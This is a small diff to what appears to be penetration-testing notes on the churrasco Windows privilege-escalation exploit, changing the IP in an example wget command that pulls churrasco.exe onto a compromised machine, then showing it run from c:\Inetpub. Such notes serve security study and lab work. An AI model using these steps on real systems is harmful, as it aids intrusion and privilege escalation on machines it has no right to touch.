@@ -10,7 +10,7 @@ Source: https://www.exploit-db.com/exploits/6705
 
 It is worth noting that churrasco needs to be transferred onto the compromised machine first. 
 Example:
-wget http://10.10.10.100/churrasco.exe -o churrasco.exe
+wget http://10.10.10.10/churrasco.exe -o churrasco.exe
 
 Once on the system, execute it:
 c:\Inetpub> churrasco
